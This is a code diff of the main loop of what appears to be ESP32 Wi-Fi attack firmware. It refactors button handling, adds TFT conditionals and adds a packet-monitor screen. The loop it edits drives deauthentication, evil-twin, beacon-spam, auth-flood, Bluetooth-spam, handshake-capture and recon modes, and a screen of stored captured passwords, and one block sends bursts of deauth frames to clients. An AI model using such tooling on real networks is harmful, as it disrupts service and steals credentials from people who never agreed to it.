+#endif // NISKALA_HAS_TFT
   if (currentState == MACRO_RUNNING && isMacroRunning) {
     macroTick();
   }
@@ -1506,14 +999,14 @@ void loop() {
       currentState = CLOUD_SYNC;
       startCloudSync();
     }
-    if (digitalRead(BTN_TOP) == LOW) {
+    if (btnTopPressed()) {
       delay(200);
       menuSelection = (menuSelection + 1) % MENU_COUNT;
       if (menuSelection >= menuScrollPos + 4) menuScrollPos = menuSelection - 3;
       else if (menuSelection < menuScrollPos) menuScrollPos = menuSelection;
       drawMainMenu();
     }
-    if (digitalRead(BTN_BOTTOM) == LOW) {
+    if (btnBottomPressed()) {
       delay(200);
       switch (menuSelection) {
         case 0: case 1: case 5:
@@ -1593,7 +1086,10 @@ void loop() {
           confirmApWifiDelete = false;
           drawApWifiView();
           break;
-      }
+        case 20:
+          currentState = PM_MONITOR;
+          drawPacketMonitor();
+          break;      }
     }
   }
   else if (currentState == AP_SCANNING) {
@@ -1611,7 +1107,7 @@ void loop() {
   }
   else if (currentState == FETCH_TEMPLATE) {
     templateFetchTick();
-    if (currentState == FETCH_TEMPLATE && (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW)) {
+    if (currentState == FETCH_TEMPLATE && (btnTopPressed() || btnBottomPressed())) {
       delay(200);
       WiFi.disconnect();
       restoreOriginalApMac();
@@ -1627,19 +1123,19 @@ void loop() {
     handleEvilTwinModeSelect();
   }
   else if (currentState == DEAUTH_MENU) {
-    if (digitalRead(BTN_BOTTOM) == LOW) {
+    if (btnBottomPressed()) {
       delay(200);
       if (isDeauthRunning) stopDeauthEngine(); else startDeauthEngine();
       drawDeauthMenu();
     }
-    if (digitalRead(BTN_TOP) == LOW) {
+    if (btnTopPressed()) {
       delay(200);
       if (isDeauthRunning) stopDeauthEngine();
       currentState = MAIN_MENU; drawMainMenu();
     }
   }
   else if (currentState == CSA_RUNNING) {
-    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
+    if (btnTopPressed() || btnBottomPressed()) {
       delay(300);
       stopCSAAttack();
       currentState = MAIN_MENU;
@@ -1647,7 +1143,7 @@ void loop() {
     }
   }
   else if (currentState == EVIL_TWIN_RUNNING) {
-    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
+    if (btnTopPressed() || btnBottomPressed()) {
       delay(300);
       stopEvilTwin();
       verifyState = 0;
@@ -1656,33 +1152,33 @@ void loop() {
     }
   }
   else if (currentState == BEACON_SPAM) {
-    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
+    if (btnTopPressed() || btnBottomPressed()) {
       delay(300); stopBeaconSpam(); currentState = MAIN_MENU; drawMainMenu();
     }
   }
   else if (currentState == PROBE_SNIFF) {
-    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
+    if (btnTopPressed() || btnBottomPressed()) {
       delay(300); stopProbeSniffer(); currentState = MAIN_MENU; drawMainMenu();
     }
   }
   else if (currentState == GLOBAL_DEAUTH) {
-    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
+    if (btnTopPressed() || btnBottomPressed()) {
       delay(300); stopGlobalDeauth(); currentState = MAIN_MENU; drawMainMenu();
     }
   }
   else if (currentState == AUTH_FLOOD_RUNNING) {
-    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
+    if (btnTopPressed() || btnBottomPressed()) {
       delay(300); stopAuthFlood(); currentState = MAIN_MENU; drawMainMenu();
     }
   }
   else if (currentState == BT_SPAM) {
-    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
+    if (btnTopPressed() || btnBottomPressed()) {
       delay(300); stopBTSpam(); currentState = MAIN_MENU; drawMainMenu();
     }
   }
   else if (currentState == CLOUD_SYNC) {
     cloudSyncTick();
-    if (currentState == CLOUD_SYNC && (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW)) {
+    if (currentState == CLOUD_SYNC && (btnTopPressed() || btnBottomPressed())) {
       delay(200);
       WiFi.disconnect();
       restoreOriginalApMac();
@@ -1704,7 +1200,7 @@ void loop() {
       g_pmfShowResult = false;
       drawWebRemoteScreen();
     }
-    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
+    if (btnTopPressed() || btnBottomPressed()) {
       delay(300);
       stopWebRemote();
       currentState = MAIN_MENU;
@@ -1713,7 +1209,7 @@ void loop() {
   }
   else if (currentState == OTA_MODE) {
     ArduinoOTA.handle();
-    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
+    if (btnTopPressed() || btnBottomPressed()) {
       delay(300);
       stopOTA();
       currentState = MAIN_MENU;
@@ -1722,7 +1218,7 @@ void loop() {
   }
   else if (currentState == BLE_SCAN) {
     if (g_bleScanning && millis() - lastUI > 500) { drawBleScan(); lastUI = millis(); }
-    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
+    if (btnTopPressed() || btnBottomPressed()) {
       delay(300);
       stopBLEScan();
       currentState = MAIN_MENU;
@@ -1730,18 +1226,18 @@ void loop() {
     }
   }
   else if (currentState == MACRO_MENU) {
-    if (digitalRead(BTN_TOP) == LOW) {
+    if (btnTopPressed()) {
       delay(200);
       macroSelection = (macroSelection + 1) % MACRO_COUNT;
       drawMacroMenu();
     }
-    if (digitalRead(BTN_BOTTOM) == LOW) {
+    if (btnBottomPressed()) {
       delay(200);
       startMacro(macroSelection);
     }
   }
   else if (currentState == MACRO_RUNNING) {
-    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
+    if (btnTopPressed() || btnBottomPressed()) {
       delay(300);
       stopAllAttacks();
       isMacroRunning = false;
@@ -1762,7 +1258,7 @@ void loop() {
           g_clients[ci].rssi, (unsigned)g_clients[ci].packets);
       }
     }
-    if (digitalRead(BTN_TOP) == LOW) {
+    if (btnTopPressed()) {
       delay(200);
       clientSelection++;
       if (clientSelection > g_clientCount) clientSelection = 0;
@@ -1770,7 +1266,7 @@ void loop() {
       else if (clientSelection >= clientScroll + 4) clientScroll = clientSelection - 3;
       drawClientMonitor();
     }
-    if (digitalRead(BTN_BOTTOM) == LOW) {
+    if (btnBottomPressed()) {
       delay(200);
       if (clientSelection == g_clientCount) {
         stopClientMonitor();
@@ -1781,41 +1277,53 @@ void loop() {
         if (clientAllowed(cmac)) {
           Serial.printf("[CLIENT] Skip allowed %02X:%02X:%02X:%02X:%02X:%02X\n",
             cmac[0], cmac[1], cmac[2], cmac[3], cmac[4], cmac[5]);
+#if NISKALA_HAS_TFT
           tft.fillRect(0, 104, 240, 10, TFT_BLACK);
           tft.setTextFont(1);
           tft.setTextColor(TFT_GREEN, TFT_BLACK);
           tft.setCursor(4, 104);
           tft.print("ALLOWED");
+#endif
         } else {
           for (int i = 0; i < cfg_deauth_burst; i++) {
             sendDeauthFrame(cmac, g_targetBSSID, 0x07);
           }
           Serial.printf("[CLIENT] Deauth %02X:%02X:%02X:%02X:%02X:%02X\n",
             cmac[0], cmac[1], cmac[2], cmac[3], cmac[4], cmac[5]);
+#if NISKALA_HAS_TFT
           tft.fillRect(0, 104, 240, 10, TFT_BLACK);
           tft.setTextFont(1);
           tft.setTextColor(TFT_RED, TFT_BLACK);
           tft.setCursor(4, 104);
           tft.print("DEAUTH OK");
+#endif
         }
       }
     }
   }
   else if (currentState == SMART_PROFILE) {
-    if (digitalRead(BTN_TOP) == LOW) {
+    if (btnTopPressed()) {
       delay(200);
       currentState = MAIN_MENU;
       drawMainMenu();
     }
-    if (digitalRead(BTN_BOTTOM) == LOW) {
+    if (btnBottomPressed()) {
       delay(200);
       startSmartRecommendedAttack();
-      while (digitalRead(BTN_BOTTOM) == LOW) delay(50);
+      while (btnBottomPressed()) delay(50);
+    }
+  }
+  else if (currentState == PM_MONITOR) {
+    if (millis() - lastUI > 500) { drawPacketMonitor(); lastUI = millis(); }
+    if (btnTopPressed() || btnBottomPressed()) {
+      delay(300);
+      currentState = MAIN_MENU;
+      drawMainMenu();
     }
   }
   else if (currentState == EAPOL_CAPTURE_RUNNING) {
     eapolCaptureTick();
-    if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
+    if (btnTopPressed() || btnBottomPressed()) {
       delay(200);
       stopEapolCapture();
       currentState = MAIN_MENU;
@@ -1824,7 +1332,7 @@ void loop() {
   }
   else if (currentState == RECON) {
     if (g_reconPhase == RECON_PHASE_HOST_LIST) {
-      if (digitalRead(BTN_TOP) == LOW) {
+      if (btnTopPressed()) {
         delay(200);
         g_reconSelection++;
         if (g_reconSelection > g_reconHostCount) g_reconSelection = 0;
@@ -1832,7 +1340,7 @@ void loop() {
         else if (g_reconSelection >= g_reconScroll + 4) g_reconScroll = g_reconSelection - 3;
         drawNetworkRecon();
       }
-      if (digitalRead(BTN_BOTTOM) == LOW) {
+      if (btnBottomPressed()) {
         delay(200);
         if (g_reconSelection == g_reconHostCount) {
           stopNetworkRecon();
@@ -1843,14 +1351,14 @@ void loop() {
         }
       }
     } else if (g_reconPhase == RECON_PHASE_PORT_RESULT) {
-      if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
+      if (btnTopPressed() || btnBottomPressed()) {
         delay(300);
         g_reconPhase = RECON_PHASE_HOST_LIST;
         drawNetworkRecon();
       }
     } else {
       reconTick();
-      if (digitalRead(BTN_TOP) == LOW || digitalRead(BTN_BOTTOM) == LOW) {
+      if (btnTopPressed() || btnBottomPressed()) {
         delay(300);
         stopNetworkRecon();
         currentState = MAIN_MENU;
@@ -1860,7 +1368,7 @@ void loop() {
   }
   else if (currentState == APWIFI_VIEW) {
     int count = apPrefs.getInt("count", 0);
-    if (digitalRead(BTN_TOP) == LOW) {
+    if (btnTopPressed()) {
       delay(200);
       confirmApWifiDelete = false;
       apWifiSelection++;
@@ -1869,7 +1377,7 @@ void loop() {
       else if (apWifiSelection >= apWifiScrollPos + 3) apWifiScrollPos = apWifiSelection - 2;
       drawApWifiView();
     }
-    if (digitalRead(BTN_BOTTOM) == LOW) {
+    if (btnBottomPressed()) {
       delay(200);
       if (apWifiSelection == count) {
         confirmApWifiDelete = false;
@@ -1899,7 +1407,7 @@ void loop() {
   else if (currentState == VIEW_PASSWORDS) {
     int total = prefs.getInt("pwd_count", 0);
     int maxSelection = total + 1;
-    if (digitalRead(BTN_TOP) == LOW) {
+    if (btnTopPressed()) {
       delay(200); confirmDeleteAll = false;
       viewSelection++;
       if (viewSelection > maxSelection) viewSelection = 0;
@@ -1909,7 +1417,7 @@ void loop() {
       }
       drawViewPasswords();
     }
-    if (digitalRead(BTN_BOTTOM) == LOW) {
+    if (btnBottomPressed()) {
       delay(200);
       if (viewSelection == maxSelection) { currentState = MAIN_MENU; drawMainMenu(); }
       else if (viewSelection == total) {
